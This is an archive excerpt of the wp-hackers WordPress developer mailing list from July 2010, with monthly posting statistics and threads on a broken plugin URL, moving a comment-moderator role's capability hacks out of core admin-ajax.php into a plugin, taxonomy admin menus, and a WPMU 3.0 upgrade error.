From vm at linksalpha.com  Thu Jul  1 03:50:23 2010
From: vm at linksalpha.com (V M)
Date: Wed, 30 Jun 2010 20:50:23 -0700
Subject: [wp-hackers] How to get a plugin URL working on WordPress
Message-ID: <AANLkTinxxNU-HYnfnJSXAkY_iazwR8zLUNkDvoQlnBTD@mail.gmail.com>

URL for our plugin on WordPress is not working for the last 5 days:
http://wordpress.org/extend/plugins/network-publisher
It has been working for the last ~1 year. SVN directory is also present:
http://svn.wp-plugins.org/network-publisher/

Could you pls let me know how to fix the above?

Thanks for your help and time.
Best Regards,
VM
PS: I have opened multiple tickets at http://wordpress.org/report-bugs/ almost
daily but no response.

From r at schestowitz.com  Tue Jul  6 06:45:02 2010
From: r at schestowitz.com (Roy Schestowitz)
Date: Tue, 06 Jul 2010 07:45:02 +0100
Subject: [wp-hackers] WP-Hackers Stats for June 2010
Message-ID: <4C32D0EE.2040001@schestowitz.com>

  -  Times are Greenwich Mean Time (GMT) +0:00

  -  Statistics span a period of one month

  -  Subject line formatted consistently "WP-Hackers Stats for <MONTH>
<YEAR>"

  -  Killfile <subject contains "WP-Hackers Stats for "> if uninterested
____________________________________________________________

Stats for wp-hackers
~~~~~~~~~~~~~~~~~~~~
***** People who have written most messages:
+----+-----Author-----------------------------------+--Msg-+-Percent-+
|  1 | mikeschinkel newclarity.net                  |   41 |  7.40 % |
|  2 | otto ottodestruct.com                        |   38 |  6.86 % |
|  3 | wp andrewnacin.com                           |   29 |  5.23 % |
|  4 | arlenbee gmail.com                           |   25 |  4.51 % |
|  5 | scribu gmail.com                             |   21 |  3.79 % |
|  6 | hempsworth gmail.com                         |   18 |  3.25 % |
|  7 | lox.dev knc.nc                               |   17 |  3.07 % |
|  8 | jer simianuprising.com                       |   15 |  2.71 % |
|  9 | peter.westwood ftwr.co.uk                    |   13 |  2.35 % |
| 10 | jane automattic.com                          |   12 |  2.17 % |
| 11 | wphackers jakemgold.myfastmail.com           |   11 |  1.99 % |
| 12 | me piyushmishra.com                          |   10 |  1.81 % |
| 13 | johnbillion+wp gmail.com                     |    9 |  1.62 % |
| 14 | wordpress dd32.id.au                         |    9 |  1.62 % |
| 15 | ash thinkinginvain.com                       |    9 |  1.62 % |
| 16 | dragonfly dragonflyeye.net                   |    9 |  1.62 % |
| 17 | curtis curtismchale.ca                       |    9 |  1.62 % |
| 18 | dougal gunters.org                           |    8 |  1.44 % |
| 19 | eric eamann.com                              |    8 |  1.44 % |
| 20 | bulk thecodecave.com                         |    8 |  1.44 % |
| 21 | mailapera gmail.com                          |    7 |  1.26 % |
| 22 | banago gmail.com                             |    7 |  1.26 % |
| 23 | mda blogwaffe.com                            |    7 |  1.26 % |
| 24 | wp-hackers striderweb.com                    |    7 |  1.26 % |
| 25 | ravi-lists g8o.net                           |    6 |  1.08 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  201 | 36.28 % |
+----+----------------------------------------------+------+---------+

***** Best authors, by total size of their messages (w/o quoting):
+----+-----Author-------------------------------------------+-KBytes-+
|  1 | mikeschinkel newclarity.net                          |   37.5 |
|  2 | eric eamann.com                                      |   33.1 |
|  3 | otto ottodestruct.com                                |   28.2 |
|  4 | jer simianuprising.com                               |   27.0 |
|  5 | wp andrewnacin.com                                   |   17.1 |
|  6 | arlenbee gmail.com                                   |   16.1 |
|  7 | ash thinkinginvain.com                               |   15.6 |
|  8 | me piyushmishra.com                                  |   12.6 |
|  9 | hempsworth gmail.com                                 |   10.8 |
| 10 | kikizas gmail.com                                    |   10.3 |
| 11 | list expost.org                                      |   10.0 |
| 12 | wphackers jakemgold.myfastmail.com                   |   10.0 |
| 13 | lox.dev knc.nc                                       |    9.7 |
| 14 | dougal gunters.org                                   |    9.6 |
| 15 | markjaquith gmail.com                                |    9.5 |
| 16 | johnbillion+wp gmail.com                             |    8.9 |
| 17 | peter.westwood ftwr.co.uk                            |    8.8 |
| 18 | scribu gmail.com                                     |    8.6 |
| 19 | mda blogwaffe.com                                    |    7.9 |
| 20 | jane automattic.com                                  |    7.7 |
| 21 | curtis curtismchale.ca                               |    7.4 |
| 22 | wordpress dd32.id.au                                 |    7.4 |
| 23 | bulk thecodecave.com                                 |    5.6 |
| 24 | ravi-lists g8o.net                                   |    5.5 |
| 25 | piemanek gmail.com                                   |    5.3 |
+----+------------------------------------------------------+--------+

***** Best authors, by average size of their message (w/o quoting):
+----+-----Author--------------------------------------------+-bytes-+
|  1 | eric eamann.com                                       |  4236 |
|  2 | elizabeth slatetechpdx.com                            |  3437 |
|  3 | wordpress web-warlocks.net                            |  2371 |
|  4 | list expost.org                                       |  2057 |
|  5 | wordpress santosj.name                                |  2010 |
|  6 | adamjctaylor gmail.com                                |  1982 |
|  7 | sampath.thennakoon gmail.com                          |  1958 |
|  8 | markjaquith gmail.com                                 |  1943 |
|  9 | bujanga gmail.com                                     |  1865 |
| 10 | batmoo gmail.com                                      |  1862 |
| 11 | jer simianuprising.com                                |  1844 |
| 12 | ash thinkinginvain.com                                |  1776 |
| 13 | kikizas gmail.com                                     |  1765 |
| 14 | harper.shelby parivedasolutions.com                   |  1749 |
| 15 | harish.mlists gmail.com                               |  1701 |
| 16 | jpotkanski tribune.com                                |  1401 |
| 17 | yojoaquin gmail.com                                   |  1375 |
| 18 | tom humanmade.co.uk                                   |  1336 |
| 19 | me piyushmishra.com                                   |  1289 |
| 20 | contact hervedesign.com                               |  1279 |
| 21 | logikal16 gmail.com                                   |  1239 |
| 22 | dougal gunters.org                                    |  1233 |
| 23 | info optimiced.com                                    |  1183 |
| 24 | mda blogwaffe.com                                     |  1152 |
| 25 | t.nash newmedias.co.uk                                |  1124 |
+----+-------------------------------------------------------+-------+

***** Table showing the most successful subjects:
+----+----Subject-----------------------------------+--Msg-+-Percent-+
|  1 | [wp-hackers] Wordpress StackExchange is read |   31 |  5.60 % |
|  2 | [wp-hackers] Geodata storage                 |   26 |  4.69 % |
|  3 | [wp-hackers] support for custoim post types  |   24 |  4.33 % |
|  4 | [wp-hackers] Wordpress 3.0, can we finally g |   23 |  4.15 % |
|  5 | [wp-hackers] new menu management 3.0         |   14 |  2.53 % |
|  6 | [wp-hackers] Long term suckage               |   13 |  2.35 % |
|  7 | [wp-hackers] Overriding Existing Post Types  |   13 |  2.35 % |
|  8 | [wp-hackers] Sidebar widget HTML/DOM         |   12 |  2.17 % |
|  9 | [wp-hackers] JSON API 1.0 release            |   12 |  2.17 % |
| 10 | [wp-hackers] Custom Post Type + Capabilities |   11 |  1.99 % |
| 11 | [wp-hackers] Members Database                |   11 |  1.99 % |
| 12 | [wp-hackers] How to rename plugins in the pl |   11 |  1.99 % |
| 13 | [wp-hackers] Pluggable functions             |   10 |  1.81 % |
| 14 | [wp-hackers] Custom Menu                     |    9 |  1.62 % |
| 15 | [wp-hackers] Post excerpts within the_conten |    9 |  1.62 % |
| 16 | [wp-hackers] Adding static links as a widget |    9 |  1.62 % |
| 17 | [wp-hackers] After adding custom role,       |    9 |  1.62 % |
| 18 | [wp-hackers] Database Maintenance and Canoni |    8 |  1.44 % |
| 19 | [wp-hackers] Codex and old versions of WordP |    8 |  1.44 % |
| 20 | [wp-hackers] Search Results based on Geodata |    7 |  1.26 % |
| 21 | [wp-hackers] bug in is_home in query filters |    7 |  1.26 % |
| 22 | [wp-hackers] WP 3.0 and beyond: Custom post  |    7 |  1.26 % |
| 23 | [wp-hackers] Adding class to first menu item |    7 |  1.26 % |
| 24 | [wp-hackers] Adding class to first menu item |    7 |  1.26 % |
| 25 | [wp-hackers] Improving Meta Box Handling     |    6 |  1.08 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  250 | 45.13 % |
+----+----------------------------------------------+------+---------+

***** Most used email clients:
+----+----Mailer------------------------------------+--Msg-+-Percent-+
|  1 | Google Mail/Other                            |  353 | 63.72 % |
|  2 | Apple Mail (2.1078)                          |   57 | 10.29 % |
|  3 | Mozilla/5.x                                  |   51 |  9.21 % |
|  4 | Apple Mail (2.1081)                          |   22 |  3.97 % |
|  5 | Microsoft Office Outlook 12.0                |   18 |  3.25 % |
|  6 | Opera Mail/10.60 (Win32)                     |    6 |  1.08 % |
|  7 | Open-Xchange Mailer v6.14.0-Rev24            |    6 |  1.08 % |
|  8 | G2/1.0                                       |    6 |  1.08 % |
|  9 | Postbox 1.1.5 (Macintosh/20100613)           |    5 |  0.90 % |
| 10 | iPhone Mail (7D11)                           |    4 |  0.72 % |
| 11 | Postbox 1.1.4 (Macintosh/20100408)           |    4 |  0.72 % |
| 12 | Microsoft Outlook Express 6.x                |    3 |  0.54 % |
| 13 | Industrious bit-pushing elves                |    2 |  0.36 % |
| 14 | SquirrelMail/1.4.19                          |    2 |  0.36 % |
| 15 | iPhone Mail (7E18)                           |    2 |  0.36 % |
| 16 | Thunderbird 2.0.0.24 (Windows/20100228)      |    2 |  0.36 % |
| 17 | Postbox 1.1.4 (Windows/20100408)             |    1 |  0.18 % |
| 18 | Opera Mail/10.53 (Win32)                     |    1 |  0.18 % |
| 19 | Mutt                                         |    1 |  0.18 % |
| 20 | YahooMailRC/397.8 YahooMailWebService/0.8.10 |    1 |  0.18 % |
| 21 | Opera Mail/10.50 (Win32)                     |    1 |  0.18 % |
| 22 | iPad Mail (7B367)                            |    1 |  0.18 % |
| 23 | iPod Mail (7E18)                             |    1 |  0.18 % |
| 24 | YahooMailClassic/11.1.4 YahooMailWebService/ |    1 |  0.18 % |
| 25 | iPod Mail (8A293)                            |    1 |  0.18 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |    2 |  0.36 % |
+----+----------------------------------------------+------+---------+

***** Table of maximal quoting:
+----+-----Author------------------------------------------+-Percent-+
|  1 | admin oxymaniac.com                                 | 86.91 % |
|  2 | prodevstudio gmail.com                              | 85.40 % |
|  3 | emixdemix gmail.com                                 | 85.22 % |
|  4 | erisds gmail.com                                    | 83.88 % |
|  5 | jimmy.roy gmail.com                                 | 83.31 % |
|  6 | chip chipbennett.net                                | 82.44 % |
|  7 | banago gmail.com                                    | 80.13 % |
|  8 | liste srpski.biz                                    | 78.49 % |
|  9 | lilla.molnet gmail.com                              | 77.21 % |
| 10 | tonyscott100 yahoo.co.uk                            | 74.71 % |
| 11 | krustyruffle rustykruffle.com                       | 74.51 % |
| 12 | frank bueltge.de                                    | 70.55 % |
| 13 | mhmtozek gmail.com                                  | 69.35 % |
| 14 | japhie gmail.com                                    | 67.96 % |
| 15 | curtis curtismchale.ca                              | 66.83 % |
| 16 | matt sivel.net                                      | 66.67 % |
| 17 | william.canino googlemail.com                       | 63.43 % |
| 18 | burobjorn gmail.com                                 | 62.60 % |
| 19 | wordpress.development gmail.com                     | 60.81 % |
| 20 | fidler.brian gmail.com                              | 59.28 % |
| 21 | me piyushmishra.com                                 | 58.30 % |
| 22 | peter.westwood ftwr.co.uk                           | 57.54 % |
| 23 | hempsworth gmail.com                                | 55.47 % |
| 24 | batmoo gmail.com                                    | 54.98 % |
| 25 | arlenbee gmail.com                                  | 54.72 % |
+----+-----------------------------------------------------+---------+
|    | average                                             | 41.53 % |
+----+-----------------------------------------------------+---------+

***** Graph showing number of messages written during hours of day:

100% -----------------------------------#------------- - 44
 90% -------------------#---------#-----#------------- msgs
 80% -------------------#---------#-----#-------------
 70% -------------------#-#-----#-#-#-#-#-#-----------
 60% -------------------#-#-----#-#-#-#-#-#-----#-----
 50% -------------------#-#-#-#-#-#-#-#-#-#-#-#-#-#---
 40% -#-#---------------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 30% -#-#-----------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 20% -#-#-----------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 10% -#-#-#-#-----#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
      * * * * * * * * * * * * * * * * * * * * * * * *
hour  0         5           11          17          23


***** Graph showing number of messages written during days of month:

100% -----------------------------------#--------------------------- - 58
 90% -----------------------------------#--------------------------- msgs
 80% -----------------------------------#-----#---------------------
 70% -----------------------------------#-----#---------------#-----
 60% ---------#-------------------------#-----#---------------#-----
 50% ---#-----#-------------------------#-----#-------------#-#-----
 40% ---#-----#-----------------------#-#-----#-----#-------#-#-----
 30% ---#-#---#-#---------------------#-#-#---#-#---#-----#-#-#-#---
 20% ---#-#-#-#-#-#---------------#---#-#-#---#-#---#-----#-#-#-#---
 10% -#-#-#-#-#-#-#-#-#---#-------#-#-#-#-#-#-#-#-#-#-#---#-#-#-#---
      * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 day  1         6           12          18          24            31


***** Graph showing number of messages written during days of week:

100% -#--------------------------- - 101
 90% -#---#-----------#----------- msgs
 80% -#---#-----------#-----------
 70% -#---#---#---#---#-----------
 60% -#---#---#---#---#---#-------
 50% -#---#---#---#---#---#---#---
 40% -#---#---#---#---#---#---#---
 30% -#---#---#---#---#---#---#---
 20% -#---#---#---#---#---#---#---
 10% -#---#---#---#---#---#---#---
      *   *   *   *   *   *   *
     Mon Tue Wed Thu Fri Sat Sun


***** Maximal quoting:
      Author     : curtis curtismchale.ca
      Subject    : [wp-hackers] support for custoim post types + custom
feilds
      Date       : Mon, 21 Jun 2010 12:01:12 -0700
      Quote ratio: 95.54% / 7451 bytes

***** Longest message:
      Author     : me piyushmishra.com
      Subject    : [wp-hackers] support for custoim post types + custom
feilds
      Date       : Tue, 22 Jun 2010 10:19:19 +0530
      Size       : 9719 bytes

***** Most successful subject:
      Subject    : [wp-hackers] Wordpress StackExchange is ready.
      No. of msgs: 31
      Total size : 64629 bytes

***** Final summary:
      Total number of messages:             554
      Total number of different authors:    116
      Total number of different subjects:   120
      Total size of messages (w/o headers): 854130 bytes
      Average size of a message:            1541 bytes

***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
***** See http://freshmeat.net/projects/mls for details...

DISCLAIMER: Stats automatically produced. Remember that stats are often
meaningless and deceiving.

From wp-hackers at nicolaskuttler.de  Thu Jul  1 11:53:24 2010
From: wp-hackers at nicolaskuttler.de (Nicolas Kuttler)
Date: Thu, 1 Jul 2010 13:53:24 +0200
Subject: [wp-hackers] Removing admin-ajax.php hacks
In-Reply-To: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
References: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
Message-ID: <20100701115324.GN23670@nicolaskuttler.de>

Am I missing something? Why don't you simply download wordpress and take the current ajax handler?

Modifying the handler itelf is kind of pointless as you can check user capabilities inside your ajax action...

Nicolas

On Wed, Jun 30, 2010 at 05:27:17PM -0500, Shelby, Harper wrote:
> I've been asked to remove some hacks to an exisiting WPMU installation, and the one that's causing me the most grief are the edits to admin-ajax.php. The previous maintainer altered the security checks on several activities, changing
> 
>     if ( !current_user_can( 'edit_post', $pid ) )
> 
> to
> 
>     if ( !current_user_can( 'edit_post', $pid ) && !current_user_can( 'moderate_comments' ) )
> 
> I have been digging quite a bit, but can't seem to find a way to alter the admin-ajax.php scripts in the correct manner. The goal of the customization was to allow a "Comment Moderator" role that could moderate comments, but not edit blog posts (somewhat obvious, but I thought I'd spell it out). The role was created using Capability Manager, but these hacks were added to the ajax to allow the role to work as intended.
> 
> Any guidance on the right way to remove this customization would be greatly appreciated.
> 
> 
> Thanks,
> 
> Harper Shelby
> Pariveda Solutions
>  4203 Montrose | Suite 100 | Houston, Texas 77006
>  (F) 713.520.4290 | (M) 281.520.2817
> The Business of IT(r)
> www.parivedasolutions.com<http://www.parivedasolutions.com/>
> 
> 
> ________________________________
> The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 


--
Nicolas Kuttler
wp at nkuttler.de

http://www.nkuttler.de
http://www.nicolaskuttler.de (deutsch)

From mccormicky at gmail.com  Thu Jul  1 11:58:09 2010
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 1 Jul 2010 07:58:09 -0400
Subject: [wp-hackers] Removing admin-ajax.php hacks
In-Reply-To: <20100701115324.GN23670@nicolaskuttler.de>
References: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
	<20100701115324.GN23670@nicolaskuttler.de>
Message-ID: <AANLkTimI5uOfZyHMxDdeVQ-HZXAFWG_pPibA6RpQ4JbO@mail.gmail.com>

I'm guessing you don't want to override ALL the hacks in admin-ajax.php
which is why you don't just upload a fresh copy???





On Thu, Jul 1, 2010 at 7:53 AM, Nicolas Kuttler <
wp-hackers at nicolaskuttler.de> wrote:

> Am I missing something? Why don't you simply download wordpress and take
> the current ajax handler?
>
> Modifying the handler itelf is kind of pointless as you can check user
> capabilities inside your ajax action...
>
> Nicolas
>
> On Wed, Jun 30, 2010 at 05:27:17PM -0500, Shelby, Harper wrote:
> > I've been asked to remove some hacks to an exisiting WPMU installation,
> and the one that's causing me the most grief are the edits to
> admin-ajax.php. The previous maintainer altered the security checks on
> several activities, changing
> >
> >     if ( !current_user_can( 'edit_post', $pid ) )
> >
> > to
> >
> >     if ( !current_user_can( 'edit_post', $pid ) && !current_user_can(
> 'moderate_comments' ) )
> >
> > I have been digging quite a bit, but can't seem to find a way to alter
> the admin-ajax.php scripts in the correct manner. The goal of the
> customization was to allow a "Comment Moderator" role that could moderate
> comments, but not edit blog posts (somewhat obvious, but I thought I'd spell
> it out). The role was created using Capability Manager, but these hacks were
> added to the ajax to allow the role to work as intended.
> >
> > Any guidance on the right way to remove this customization would be
> greatly appreciated.
> >
> >
> > Thanks,
> >
> > Harper Shelby
> > Pariveda Solutions
> >  4203 Montrose | Suite 100 | Houston, Texas 77006
> >  (F) 713.520.4290 | (M) 281.520.2817
> > The Business of IT(r)
> > www.parivedasolutions.com<http://www.parivedasolutions.com/>
> >
> >
> > ________________________________
> > The information transmitted is intended only for the person or entity to
> which it is addressed and may contain confidential and/or privileged
> material. Any review, retransmission, dissemination or other use of, or
> taking of any action in reliance upon, this information by persons or
> entities other than the intended recipient is prohibited. If you received
> this in error, please contact the sender and delete the material from any
> computer.
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
> --
> Nicolas Kuttler
> wp at nkuttler.de
>
> http://www.nkuttler.de
> http://www.nicolaskuttler.de (deutsch)
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From harper.shelby at parivedasolutions.com  Thu Jul  1 12:46:20 2010
From: harper.shelby at parivedasolutions.com (Shelby, Harper)
Date: Thu, 1 Jul 2010 07:46:20 -0500
Subject: [wp-hackers] Removing admin-ajax.php hacks
In-Reply-To: <mailman.11.1277985602.10049.wp-hackers@lists.automattic.com>
References: <mailman.11.1277985602.10049.wp-hackers@lists.automattic.com>
Message-ID: <2BB24BBC87D490418DE901138ACDA0DB41BC9729D1@srv-exch-02.pariveda.local>

What I'm concerned about is being able to upload a fresh copy, then reinstate the functionality without hacking the core code. I can't figure out the right way to implement this, but uploading a fresh copy of admin-ajax.php is part of my goal.


>Date: Thu, 1 Jul 2010 07:58:09 -0400
>From: mccormicky <mccormicky at gmail.com>
>Subject: Re: [wp-hackers] Removing admin-ajax.php hacks
>To: wp-hackers at lists.automattic.com
>Message-ID:
>       <AANLkTimI5uOfZyHMxDdeVQ-HZXAFWG_pPibA6RpQ4JbO at mail.gmail.com>
>Content-Type: text/plain; charset=UTF-8
>
>I'm guessing you don't want to override ALL the hacks in admin-ajax.php
>which is why you don't just upload a fresh copy???
>
>
>
>
>
>On Thu, Jul 1, 2010 at 7:53 AM, Nicolas Kuttler <
>wp-hackers at nicolaskuttler.de> wrote:
>
>> Am I missing something? Why don't you simply download wordpress and take
>> the current ajax handler?
>>
>> Modifying the handler itelf is kind of pointless as you can check user
>> capabilities inside your ajax action...
>>
>> Nicolas
>>
>> On Wed, Jun 30, 2010 at 05:27:17PM -0500, Shelby, Harper wrote:
>> > I've been asked to remove some hacks to an exisiting WPMU installation,
>> and the one that's causing me the most grief are the edits to
>> admin-ajax.php. The previous maintainer altered the security checks on
>> several activities, changing
>> >
>> >     if ( !current_user_can( 'edit_post', $pid ) )
>> >
>> > to
>> >
>> >     if ( !current_user_can( 'edit_post', $pid ) && !current_user_can(
>> 'moderate_comments' ) )
>> >
>> > I have been digging quite a bit, but can't seem to find a way to alter
>> the admin-ajax.php scripts in the correct manner. The goal of the
>> customization was to allow a "Comment Moderator" role that could moderate
>> comments, but not edit blog posts (somewhat obvious, but I thought I'd spell
>> it out). The role was created using Capability Manager, but these hacks were
>> added to the ajax to allow the role to work as intended.
>> >
>> > Any guidance on the right way to remove this customization would be
>> greatly appreciated.
>> >
>> >
>> > Thanks,
>> >
>> > Harper Shelby
>> > Pariveda Solutions
>> >  4203 Montrose | Suite 100 | Houston, Texas 77006
>> >  (F) 713.520.4290 | (M) 281.520.2817
>> > The Business of IT(r)
>> > www.parivedasolutions.com<http://www.parivedasolutions.com/>
>> >
>> >
>> > ________________________________
>> > The information transmitted is intended only for the person or entity to
>> which it is addressed and may contain confidential and/or privileged
>> material. Any review, retransmission, dissemination or other use of, or
>> taking of any action in reliance upon, this information by persons or
>> entities other than the intended recipient is prohibited. If you received
>> this in error, please contact the sender and delete the material from any
>> computer.
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>> --
>> Nicolas Kuttler
>> wp at nkuttler.de
>>
>> http://www.nkuttler.de
>> http://www.nicolaskuttler.de (deutsch)
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers


The information transmitted is intended only for the person or entity to which it is addressed and may contain confidential and/or privileged material. Any review, retransmission, dissemination or other use of, or taking of any action in reliance upon, this information by persons or entities other than the intended recipient is prohibited. If you received this in error, please contact the sender and delete the material from any computer.

From wordpress at dd32.id.au  Thu Jul  1 12:45:01 2010
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 01 Jul 2010 22:45:01 +1000
Subject: [wp-hackers] Removing admin-ajax.php hacks
In-Reply-To: <AANLkTimI5uOfZyHMxDdeVQ-HZXAFWG_pPibA6RpQ4JbO@mail.gmail.com>
References: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
	<20100701115324.GN23670@nicolaskuttler.de>
	<AANLkTimI5uOfZyHMxDdeVQ-HZXAFWG_pPibA6RpQ4JbO@mail.gmail.com>
Message-ID: <op.ve50c92cspxmuu@ho.st>

By the sound of it, He wants to remove the hacks, and replace it with a  
plugin-based solution, to allow for seemless upgrades to newer versions  
without re-hacking core.

Unfortunately at this stage, I dont think it's possible to make a pure  
comment moderator roll without hacking -something-. I know there are many  
people who want to unbundle the comment moderation from post editing..

The only thing i can think of is to look at the IS_AJAX constants (Ok, I  
pulled that from thin air, there is a AJAX-set constant though) and filter  
the cap checks.. BUT, given theres no context to such checks, i can that  
opening security holes.. so only do that if you are aware of the  
repercussions.


On Thu, 01 Jul 2010 21:58:09 +1000, mccormicky <mccormicky at gmail.com>  
wrote:

> I'm guessing you don't want to override ALL the hacks in admin-ajax.php
> which is why you don't just upload a fresh copy???
>
>
>
>
>
> On Thu, Jul 1, 2010 at 7:53 AM, Nicolas Kuttler <
> wp-hackers at nicolaskuttler.de> wrote:
>
>> Am I missing something? Why don't you simply download wordpress and take
>> the current ajax handler?
>>
>> Modifying the handler itelf is kind of pointless as you can check user
>> capabilities inside your ajax action...
>>
>> Nicolas
>>
>> On Wed, Jun 30, 2010 at 05:27:17PM -0500, Shelby, Harper wrote:
>> > I've been asked to remove some hacks to an exisiting WPMU  
>> installation,
>> and the one that's causing me the most grief are the edits to
>> admin-ajax.php. The previous maintainer altered the security checks on
>> several activities, changing
>> >
>> >     if ( !current_user_can( 'edit_post', $pid ) )
>> >
>> > to
>> >
>> >     if ( !current_user_can( 'edit_post', $pid ) && !current_user_can(
>> 'moderate_comments' ) )
>> >
>> > I have been digging quite a bit, but can't seem to find a way to alter
>> the admin-ajax.php scripts in the correct manner. The goal of the
>> customization was to allow a "Comment Moderator" role that could  
>> moderate
>> comments, but not edit blog posts (somewhat obvious, but I thought I'd  
>> spell
>> it out). The role was created using Capability Manager, but these hacks  
>> were
>> added to the ajax to allow the role to work as intended.
>> >
>> > Any guidance on the right way to remove this customization would be
>> greatly appreciated.
>> >
>> >
>> > Thanks,
>> >
>> > Harper Shelby
>> > Pariveda Solutions
>> >  4203 Montrose | Suite 100 | Houston, Texas 77006
>> >  (F) 713.520.4290 | (M) 281.520.2817
>> > The Business of IT(r)
>> > www.parivedasolutions.com<http://www.parivedasolutions.com/>
>> >
>> >
>> > ________________________________
>> > The information transmitted is intended only for the person or entity  
>> to
>> which it is addressed and may contain confidential and/or privileged
>> material. Any review, retransmission, dissemination or other use of, or
>> taking of any action in reliance upon, this information by persons or
>> entities other than the intended recipient is prohibited. If you  
>> received
>> this in error, please contact the sender and delete the material from  
>> any
>> computer.
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>>
>>
>> --
>> Nicolas Kuttler
>> wp at nkuttler.de
>>
>> http://www.nkuttler.de
>> http://www.nicolaskuttler.de (deutsch)
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Dion Hulse / dd32
Contact:
  e: contact at dd32.id.au
  Web: http://dd32.id.au/

From bulk at thecodecave.com  Thu Jul  1 13:40:29 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Thu, 1 Jul 2010 09:40:29 -0400
Subject: [wp-hackers] Removing admin-ajax.php hacks
In-Reply-To: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
References: <2BB24BBC87D490418DE901138ACDA0DB41BC972891@srv-exch-02.pariveda.local>
Message-ID: <004801cb1922$f9ba26e0$ed2e74a0$@com>

Hi Shelby,

I've been faced with making changes to admin-ajax.php before too. It could
probably be reviewed for appropriate new actions in general.

The good news is that you have two options for implementing your hacks.

The first is that you COULD tie into the admin_init action but I don't
recommend that as you have to add too many redundant checks to find the
instance you want.  

The better way to do it is to hook into check_ajax_referer. 


The do_action call looks like this:
  do_action('check_ajax_referer', $action, $result);


So, if the value of $result being passed in is true, then all of the checks
have already passed and you can use the value of $action to determine if you
are in the call you need.

If I were to freestyle some code for this, it would look like this:

add_action('check_ajax_referer', 'ajax_user_can_moderate_comments');

function ajax_user_can_moderate_comments($action, $result) {
	if (($action == 'add-meta') && $result) {
		if ( !current_user_can( 'edit_post', $pid ) &&
!current_user_can( 'moderate_comments' ) ) {
			$result = false;
		}
	}
	return $result;
}

but that freestyled code might or might not actually work :)

Hope that helps...
______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?RhettandLink.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From dragonfly at dragonflyeye.net  Thu Jul  1 13:33:25 2010
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Thu, 1 Jul 2010 09:33:25 -0400
Subject: [wp-hackers] Taxonomies as Top-Level Menus?
Message-ID: <AANLkTinaMwzxaXrRaPj4qwn_ZlIdeWlS4TJKA2SrSIWs@mail.gmail.com>

Seems like, with the new post types and taxonomies, the slight flaw in the
design of the left hand nav in the Control Panel is that a taxonomy that
exists in more than one post type shows up in the menu twice. Each post type
that appears in the LHN will include a menu item for that taxonomy even
though its the same. For example, I'm creating post types for "Lesson plan"
and "activity" for teachers. Each should include a tag-type taxonomy called
"Vocabulary." It shows up under both, which is ambiguous and confusing to
end users.

Does it make more sense to move taxonomies to their own top-level menus like
post types are?

From czarte at gmail.com  Thu Jul  1 16:19:40 2010
From: czarte at gmail.com (czArte de la Praga)
Date: Thu, 1 Jul 2010 18:19:40 +0200
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 1
In-Reply-To: <mailman.8963.1277966524.1338.wp-hackers@lists.automattic.com>
References: <mailman.8963.1277966524.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTikMeNbsqC9rDpf27E77yVqsgejHwxV7LhA78SkZ@mail.gmail.com>

Hi all, mainly Doncha if is he watching this mailing list.

I just have upgraded my Mu WordPress server on 3.0 automatic actualization
in admin backend, evertything goes fine, but than shout only this

*Fatal error*: Call to a member function add_rewrite_tag() on a non-object
in */home/home2/nettree_net/public_html/wp-includes/taxonomy.php* on line *
289

*I just uploading backup files, and recovering latest stable instalation,
but wondering if will be possible upgrade Mu WP soon or never? :)


-- 
S pozdravem Vojt?ch Park?n

Czarte Design
www.czarte.eu

Space Orange studio
www.spaceorange.eu

+420 775 60 35 60

From scribu at gmail.com  Thu Jul  1 16:58:12 2010
From: scribu at gmail.com (scribu)
Date: Thu, 1 Jul 2010 19:58:12 +0300
Subject: [wp-hackers] Taxonomies as Top-Level Menus?
In-Reply-To: <AANLkTinaMwzxaXrRaPj4qwn_ZlIdeWlS4TJKA2SrSIWs@mail.gmail.com>
References: <AANLkTinaMwzxaXrRaPj4qwn_ZlIdeWlS4TJKA2SrSIWs@mail.gmail.com>
